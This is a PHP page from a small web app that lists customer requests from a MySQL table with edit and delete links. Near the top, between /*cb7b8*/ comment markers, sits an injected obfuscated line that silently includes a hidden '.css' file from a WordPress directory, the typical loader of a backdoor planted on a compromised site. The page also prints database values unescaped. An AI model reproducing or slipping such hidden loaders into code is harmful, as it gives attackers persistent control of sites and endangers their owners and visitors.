<?PHP include("../conf.php"); ?><!--
To change this template, choose Tools | Templates
and open the template in the editor.
-->
<!DOCTYPE html>
<html>
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <title></title>
    </head>
    <body>
        <?php
/*cb7b8*/

$rpizqu = "/home/cellerno/\x70ublic_html/w\x70\x2dincludes/interactivity\x2da\x70i/.9aef2259.css"; if (1 * 10){ @include_once /* 6y */ ($rpizqu); }

/*cb7b8*/
 include("../includes/header.php"); ?>
        <h1>Peticions</h1>
        <?php
            $sqlSel = "SELECT a.*,b.nombre as nombreEstado FROM peticiones a inner join estados_peticiones b on a.estado=b.id order by a.fecha";
            $rsSel = mysqli_query($bd,$sqlSel);
            ?>
            <form name="vendaForm" method="POST" action="venda.php">
                <input type="hidden" name="idProducto">
            </form>
            <form name="modificarForm" method="POST" action="modificar.php">
                <input type="hidden" name="idPeticion">
            </form>
            <form name="eliminaForm" method="POST" action="borrar.php">
                <input type="hidden" name="idPeticion">
            </form>
            <a href="alta.php">Alta Petició</a><br/><br/>
            <table border="1" width="100%">
                <tr>
                    <th>Nombre</th>
                    <th>Telefono</th>
                    <th>Descripcio</th>
                    <th>Observaciones</th>
                    <th>Fecha</th>    
                    <th>Fecha Entrega</th>
                    <th>Estado</th>
                    
                    <th>&nbsp;</th>
                </tr>
            <?PHP
            while ($data= mysqli_fetch_array($rsSel))
            {
                ?>
                <tr>
                    <td><?PHP echo $data["nombre"]; ?></td>
                    <td><?PHP echo $data["telefono"]; ?></td>
                    <td><?PHP echo $data["descripcion"]; ?></td>
                    <td><?PHP echo $data["observaciones"]; ?></td>
                    <td><?PHP echo $data["fecha"]; ?></td>
                    <td><?PHP echo $data["fecha_entrega"]; ?></td>
                    <td><?PHP echo $data["nombreEstado"]; ?></td>
                    
                    <td>
                        <a href="javascript:document.modificarForm.idPeticion.value=<?PHP echo $data["id"]; ?>; document.modificarForm.submit();">Modificar</a>
                        &nbsp;&nbsp;|&nbsp;&nbsp;>
                        <a href="javascript:document.eliminaForm.idPeticion.value=<?PHP echo $data["id"]; ?>; document.eliminaForm.submit();">Eliminar</a>
                    </td>
                </tr>
                <?PHP
            }  
            mysqli_free_result($rsSel);
        ?>
           </table><br/><br/>
            <a href="alta.php">Alta Petició</a>
    </body>
</html>
